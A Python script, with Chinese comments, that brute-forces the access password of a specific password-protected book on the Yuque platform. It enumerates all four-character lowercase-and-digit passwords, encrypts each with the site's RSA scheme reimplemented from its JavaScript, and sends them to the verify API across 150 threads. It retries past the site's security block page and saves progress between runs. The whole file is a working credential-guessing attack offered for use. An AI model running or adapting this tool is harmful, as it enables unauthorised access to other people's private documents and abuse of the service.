import traceback
import time
import secrets
from typing import Tuple
import requests
import string
import sys
import os
from os import path
import json
from concurrent.futures import ThreadPoolExecutor

target = '36967259'
nthreads = 150
real_pw = ''

# 你给出的 JS 对象（直接复制为 Python 字典）
n_data = {
    0: 252699269, 1: 155098963, 2: 50742627, 3: 8072937,
    4: 37531058, 5: 117513028, 6: 33045173, 7: 22910293,
    8: 57120881, 9: 1197487, 10: 95411655, 11: 251996978,
    12: 133694540, 13: 51427105, 14: 201644570, 15: 40320074,
    16: 221018871, 17: 88849083, 18: 121697511, 19: 239842238,
    20: 165280755, 21: 170163132, 22: 60080926, 23: 19037735,
    24: 89571091, 25: 114595196, 26: 227516153, 27: 45029240,
    28: 199126524, 29: 8451233, 30: 219060947, 31: 85810964,
    32: 207437460, 33: 172397630, 34: 78336313, 35: 37431772,
    36: 40899,
    's': 0, 't': 37
}



def rsa_encrypt(message: str, n = n_data, e: int = 65537) -> str:
    """
    使用 RSA 公钥 (n, e) 加密明文字符串，返回十六进制密文。
    完全遵循原 JS 代码的 PKCS#1 v1.5 填充与输出格式。
    """
    
    # 提取数字部分（按索引 0..36）
    digits = [n_data[i] for i in range(n_data['t'])]

    # 还原大整数 n (每个 digit 视为 32 位的基)
    n = 0
    for i, d in enumerate(digits):
        n += d << (32 * i)   # 等价于 d * (2**32)**i

    # print("模数 n =", n)
    # print("十六进制:", hex(n))
    
    # 1. 计算模数字节长度 k
    k = (n.bit_length() + 7) // 8

    # 2. 将明文转为 UTF-8 字节序列
    data = message.encode('utf-8')
    data_len = len(data)

    # 3. 检查长度（PKCS#1 要求至少 11 字节填充开销）
    if k < data_len + 11:
        raise ValueError("Message too long for RSA key size")

    # 4. 构建填充块：0x00 || 0x02 || PS || 0x00 || data
    #    PS 长度 = k - 3 - data_len，内容为非零随机字节
    ps_len = k - 3 - data_len
    # 生成 PS（每个字节 1~255，避开 0）
    ps = bytes(secrets.randbelow(255) + 1 for _ in range(ps_len))

    # 5. 组装完整块
    block = b'\x00\x02' + ps + b'\x00' + data
    assert len(block) == k

    # 6. 块转整数并执行 RSA 加密 (m^e mod n)
    m = int.from_bytes(block, byteorder='big')
    c = pow(m, e, n)

    # 7. 转为十六进制，确保长度为偶数（原 JS 行为）
    hex_str = format(c, 'x')
    if len(hex_str) % 2 == 1:
        hex_str = '0' + hex_str

    return hex_str
    
def hex_to_base64(hex_str):
    D = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    result = ""
    i = 0
    n = len(hex_str)
    while i + 3 <= n:
        chunk = hex_str[i:i+3]
        val = int(chunk, 16)
        result += D[val >> 6] + D[val & 63]
        i += 3
    if i + 1 == n:
        val = int(hex_str[i:i+1], 16)
        result += D[val << 2]
    elif i + 2 == n:
        val = int(hex_str[i:i+2], 16)
        result += D[val >> 2] + D[((val & 3) << 4)]
    # 补等号
    while len(result) % 4 != 0:
        result += "="
    return result
    
def crack_pw(target, pw, retry=100):    

    url = f'https://www.yuque.com/api/books/{target}/verify'
    ts = int(time.time())
    data = {
        'password': hex_to_base64(rsa_encrypt(f"{ts}:{pw}"))
    }
    hdrs = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
        'Referer': 'https://www.yuque.com/',
    }
    
    for i in range(retry):
        res = requests.put(url, json=data, headers=hdrs)
        if '<html>' not in res.text:
            break
        if i == retry - 1:
            raise ValueError('很抱歉，由于您访问的URL有可能对网站造成安全威胁，您的访问被阻断')
    print(res.text)
    return res.status_code // 100 == 2
    
def load_pws():
    s = string.digits + string.ascii_lowercase
    pw_fname = 'pws.json'
    if path.isfile(pw_fname):
        pws = open(pw_fname, encoding='utf8').read()
        pws = json.loads(pws)
    else:
        pws = []
        for a in s:
            for b in s:
                for c in s:
                    for d in s:
                        pw = a + b + c + d
                        print(pw)
                        pws.append(pw)
        open(pw_fname, 'w', encoding='utf8').write(json.dumps(pws))
    return pws
    
def tr_crack_pw(target, pw):
    try:
        global real_pw
        print(f'try: {pw}')
        if crack_pw(target, pw): real_pw = pw
    except KeyboardInterrupt:
        raise
    except:
        traceback.print_exc()

def main():
    pws = load_pws()
    idx_fname = 'pw.idx'
    if path.isfile(idx_fname):
        st = open(idx_fname, encoding='utf8').read()
        st = int(st)
    else:
        st = 0
    pool = ThreadPoolExecutor(nthreads)
    hdls = []
    for i, pw in enumerate(pws[st:], st):
        h = pool.submit(tr_crack_pw, target, pw)
        hdls.append(h)
        if len(hdls) > nthreads:
            for h in hdls: h.result()
            hdls = []
            open(idx_fname, 'w', encoding='utf8').write(str(i + 1))
        if real_pw:
            print(f'pw: {real_pw}')
            sys.exit()

    for h in hdls: 
        h.result()
    open(idx_fname, 'w', encoding='utf8').write(str(len(pws)))

if __name__ == '__main__': main()